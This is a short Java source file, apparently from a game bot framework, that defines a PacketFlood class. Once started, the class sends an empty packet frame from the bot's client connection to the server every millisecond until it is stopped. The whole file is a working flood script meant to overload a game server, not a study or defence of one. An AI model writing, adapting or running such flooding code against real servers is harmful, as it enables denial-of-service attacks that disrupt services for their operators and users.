package rs.bots.scripts;

import rs.bots.BotManager;
import rs.bots.BotThreadFactory;

import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

/**
 * Created by Kai on 11/02/2016.
 *
 * @ Jet Kai
 */
public class PacketFlood {

    private BotManager AABotManager;

    private ScheduledExecutorService threadPool = null;

    public PacketFlood(BotManager AABotManager) {
        this.AABotManager = AABotManager;
    }

    public void start() {
        if (!isRunning())
            threadPool.scheduleAtFixedRate(() -> getAABotManager().getClient().getStream().createFrame(0), 0L, 1, TimeUnit.MILLISECONDS);
    }

    private boolean isRunning() {
        if (threadPool != null && !threadPool.isShutdown())
            return true;
        startThread();
        return false;
    }

    private void startThread() {
        threadPool = Executors.newSingleThreadScheduledExecutor(new BotThreadFactory());
    }

    public void stop() {
        if (threadPool != null) {
            threadPool.shutdownNow();
            threadPool = null;
        }
    }

    public BotManager getAABotManager() {
        return AABotManager;
    }

}
